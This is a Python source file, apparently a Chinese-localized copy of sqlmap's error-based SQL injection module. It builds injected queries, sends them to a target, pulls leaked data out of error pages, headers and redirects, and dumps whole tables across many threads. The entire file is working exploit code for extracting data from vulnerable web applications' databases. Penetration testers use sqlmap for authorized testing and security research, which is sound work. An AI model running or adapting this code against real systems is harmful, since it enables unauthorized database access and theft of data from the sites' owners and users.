#!/usr/bin/env python
#coding=utf-8

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import extractRegexResult
from lib.core.common import getConsoleWidth
from lib.core.common import getPartRun
from lib.core.common import getUnicode
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.common import wasLastResponseHTTPError
from lib.core.convert import hexdecode
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import HTTP_HEADER
from lib.core.exception import SqlmapDataException
from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
from lib.core.settings import MIN_ERROR_CHUNK_LENGTH
from lib.core.settings import MAX_ERROR_CHUNK_LENGTH
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import ROTATING_CHARS
from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar

def _oneShotErrorUse(expression, field=None, chunkTest=False):
    offset = 1
    rotator = 0
    partialValue = None
    threadData = getCurrentThreadData()
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal and PARTIAL_VALUE_MARKER in retVal:
        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")
        logger.info(u"恢复部分值: '%s'" % _formatPartialContent(partialValue))
        offset += len(partialValue)

    threadData.resumed = retVal is not None and not partialValue

    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:
        debugMsg = u"搜索错误块长度..."
        logger.debug(debugMsg)

        current = MAX_ERROR_CHUNK_LENGTH
        while current >= MIN_ERROR_CHUNK_LENGTH:
            testChar = str(current % 10)
            testQuery = "SELECT %s('%s',%d)" % ("REPEAT" if Backend.isDbms(DBMS.MYSQL) else "REPLICATE", testChar, current)
            result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))

            if (result or "").startswith(testChar):
                if result == testChar * current:
                    kb.errorChunkLength = current
                    break
                else:
                    result = re.search(r"\A\w+", result).group(0)
                    candidate = len(result) - len(kb.chars.stop)
                    current = candidate if candidate != current else current - 1
            else:
                current = current / 2

        if kb.errorChunkLength:
            hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)
        else:
            kb.errorChunkLength = 0

    if retVal is None or partialValue:
        try:
            while True:
                check = r"(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
                trimcheck = r"(?si)%s(?P<result>[^<\n]*)" % kb.chars.start

                if field:
                    nulledCastedField = agent.nullAndCastField(field)

                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and not any(_ in field for _ in ("COUNT", "CASE")) and kb.errorChunkLength and not chunkTest:
                        extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(field), expression).group(0)
                        if extendedField != field:  # e.g. MIN(surname)
                            nulledCastedField = extendedField.replace(field, nulledCastedField)
                            field = extendedField
                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)

                # 伪造基于错误的SQL注入请求
                vector = kb.injection.data[kb.technique].vector
                query = agent.prefixQuery(vector)
                query = agent.suffixQuery(query)
                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
                injExpression = unescaper.escape(injExpression)
                injExpression = query.replace("[QUERY]", injExpression)
                payload = agent.payload(newValue=injExpression)

                # 执行请求
                page, headers, _ = Request.queryPage(payload, content=True, raise404=False)

                incrementCounter(kb.technique)

                if page and conf.noEscape:
                    page = re.sub(r"('|\%%27)%s('|\%%27).*?('|\%%27)%s('|\%%27)" % (kb.chars.start, kb.chars.stop), "", page)

                # 解析返回的页面以获取精确的基于错误的SQL注入输出
                output = reduce(lambda x, y: x if x is not None else y, (\
                        extractRegexResult(check, page), \
                        extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None), \
                        extractRegexResult(check, listToStrValue([headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()] if headers else None)), \
                        extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)), \
                        None)

                if output is not None:
                    output = getUnicode(output)
                else:
                    trimmed = extractRegexResult(trimcheck, page) \
                        or extractRegexResult(trimcheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None) \
                        or extractRegexResult(trimcheck, listToStrValue([headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()] if headers else None)) \
                        or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)

                    if trimmed:
                        if not chunkTest:
                            warnMsg = u"服务器可能减少了检测到的输出(由于其长度或内容):"
                            warnMsg += safecharencode(trimmed)
                            logger.warn(warnMsg)

                        if not kb.testMode:
                            check = r"(?P<result>[^<>\n]*?)%s" % kb.chars.stop[:2]
                            output = extractRegexResult(check, trimmed, re.IGNORECASE)

                            if not output:
                                check = "(?P<result>[^\s<>'\"]+)"
                                output = extractRegexResult(check, trimmed, re.IGNORECASE)
                            else:
                                output = output.rstrip()

                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):
                    if offset == 1:
                        retVal = output
                    else:
                        retVal += output if output else ''

                    if output and kb.errorChunkLength and len(output) >= kb.errorChunkLength and not chunkTest:
                        offset += kb.errorChunkLength
                    else:
                        break

                    if output and conf.verbose in (1, 2) and not conf.api:
                        if kb.fileReadMode:
                            dataToStdout(_formatPartialContent(output).replace(r"\n", "\n").replace(r"\t", "\t"))
                        elif offset > 1:
                            rotator += 1

                            if rotator >= len(ROTATING_CHARS):
                                rotator = 0

                            dataToStdout("\r%s\r" % ROTATING_CHARS[rotator])
                else:
                    retVal = output
                    break
        except:
            if retVal is not None:
                hashDBWrite(expression, "%s%s" % (retVal, PARTIAL_VALUE_MARKER))
            raise

        retVal = decodeHexValue(retVal) if conf.hexConvert else retVal

        if isinstance(retVal, basestring):
            retVal = htmlunescape(retVal).replace("<br>", "\n")

        retVal = _errorReplaceChars(retVal)

        if retVal is not None:
            hashDBWrite(expression, retVal)

    else:
        _ = "(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
        retVal = extractRegexResult(_, retVal) or retVal

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def _errorFields(expression, expressionFields, expressionFieldsList, num=None, emptyFields=None, suppressOutput=False):
    values = []
    origExpr = None

    width = getConsoleWidth()
    threadData = getCurrentThreadData()

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = NULL if emptyFields and field in emptyFields else _oneShotErrorUse(expressionReplaced, field)

        if not kb.threadContinue:
            return None

        if not suppressOutput:
            if kb.fileReadMode and output and output.strip():
                print
            elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
                status = "[%s] [INFO] %s: %s" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))

                if len(status) > width:
                    status = "%s..." % status[:width - 3]

                dataToStdout("%s\n" % status)

        if isinstance(num, int):
            expression = origExpr

        values.append(output)

    return values

def _errorReplaceChars(value):
    """
    恢复安全替换字符
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.chars.space, " ").replace(kb.chars.dollar, "$").replace(kb.chars.at, "@").replace(kb.chars.hash_, "#")

    return retVal

def _formatPartialContent(value):
    """
    为安全控制台输出准备的(可能是已编码的)部分内容
    """

    if value and isinstance(value, basestring):
        try:
            value = hexdecode(value)
        except:
            pass
        finally:
            value = safecharencode(value)

    return value

def errorUse(expression, dump=False):
    """
    在受影响的参数上使用基于错误的SQL注入漏洞以获取SQL查询的输出。
    """

    initTechnique(kb.technique)

    abortedFlag = False
    count = None
    emptyFields = []
    start = time.time()
    startLimit = 0
    stopLimit = None
    value = None

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # 如果从API调用引擎，请设置kb.partRun
    kb.partRun = getPartRun(alias=False) if conf.api else None

    # 我们必须检查SQL查询是否能返回多个条目，
    # 在这种情况下，会伪造SQL限制查询输出一个条目
    # 注意:我们假设只有从表中获取到查询数据的才能返回多个条目

    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) \
       or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not \
       expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
       and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # 计算输出的SQL查询条目数
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
            count = unArrayizeValue(_oneShotErrorUse(countedExpression, countedExpressionFields))

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = u"使用的SQL查询返回%d个条目" % stopLimit
                    logger.info(infoMsg)

            elif count and not count.isdigit():
                warnMsg = u"无法计算提供的SQL查询的条目数，sqlmap将假定它只返回一个条目"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                if not count:
                    warnMsg = u"提供的SQL查询没有返回任何输出"
                    logger.warn(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            if isNumPosStrValue(count) and int(count) > 1:
                # 在巨大的表上，如果每行检索都需要ORDER BY则性能会下降很多
                # （在使用ERROR注入的表转储中最为显着）
                # SLOW_ORDER_COUNT_THRESHOLD = 10000
                if " ORDER BY " in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:
                    message = u"由于查询的表很大，您是否要删除ORDER BY子句以获得一致性的速度?[Y/N] "

                    if readInput(message, default="N", boolean=True):
                        expression = expression[:expression.index(" ORDER BY ")]

                numThreads = min(conf.threads, (stopLimit - startLimit))

                threadData = getCurrentThreadData()

                try:
                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))
                except OverflowError:
                    errMsg = u"查询范围(%d到%d)太大," % (startLimit, stopLimit)
                    errMsg += u"请重新运行'--fresh-queries'选项"
                    raise SqlmapDataException(errMsg)

                threadData.shared.value = BigArray()
                threadData.shared.buffered = []
                threadData.shared.counter = 0
                threadData.shared.lastFlushed = startLimit - 1
                threadData.shared.showEta = conf.eta and (stopLimit - startLimit) > 1

                if threadData.shared.showEta:
                    threadData.shared.progress = ProgressBar(maxValue=(stopLimit - startLimit))

                if kb.dumpTable and (len(expressionFieldsList) < (stopLimit - startLimit) > CHECK_ZERO_COLUMNS_THRESHOLD):
                    for field in expressionFieldsList:
                        if _oneShotErrorUse("SELECT COUNT(%s) FROM %s" % (field, kb.dumpTable)) == '0':
                            emptyFields.append(field)
                            debugMsg = u"表'%s'的列'%s'将不会被转储，" % (field, kb.dumpTable)
                            debugMsg += u"因为它看起来是空的"
                            logger.debug(debugMsg)

                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                    kb.suppressResumeInfo = True
                    debugMsg = u"抑制恢复控制台只显示20行信息，"
                    debugMsg += u"因为打印大量的信息流，会需要很长的时间"
                    logger.debug(debugMsg)

                try:
                    def errorThread():
                        threadData = getCurrentThreadData()

                        while kb.threadContinue:
                            with kb.locks.limit:
                                try:
                                    valueStart = time.time()
                                    threadData.shared.counter += 1
                                    num = threadData.shared.limits.next()
                                except StopIteration:
                                    break

                            output = _errorFields(expression, expressionFields, expressionFieldsList, num, emptyFields, threadData.shared.showEta)

                            if not kb.threadContinue:
                                break

                            if output and isListLike(output) and len(output) == 1:
                                output = output[0]

                            with kb.locks.value:
                                index = None
                                if threadData.shared.showEta:
                                    threadData.shared.progress.progress(time.time() - valueStart, threadData.shared.counter)
                                for index in xrange(1 + len(threadData.shared.buffered)):
                                    if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
                                        break
                                threadData.shared.buffered.insert(index or 0, (num, output))
                                while threadData.shared.buffered and threadData.shared.lastFlushed + 1 == threadData.shared.buffered[0][0]:
                                    threadData.shared.lastFlushed += 1
                                    threadData.shared.value.append(threadData.shared.buffered[0][1])
                                    del threadData.shared.buffered[0]

                    runThreads(numThreads, errorThread)

                except KeyboardInterrupt:
                    abortedFlag = True
                    warnMsg = u"用户在枚举期间中止，sqlmap将只显示部分输出"
                    logger.warn(warnMsg)

                finally:
                    threadData.shared.value.extend(_[1] for _ in sorted(threadData.shared.buffered))
                    value = threadData.shared.value
                    kb.suppressResumeInfo = False

    if not value and not abortedFlag:
        value = _errorFields(expression, expressionFields, expressionFieldsList)

    if value and isListLike(value) and len(value) == 1 and isinstance(value[0], basestring):
        value = value[0]

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = u"在%.2f秒内执行了%d个查询" % (kb.counters[kb.technique], duration)
        logger.debug(debugMsg)

    return value
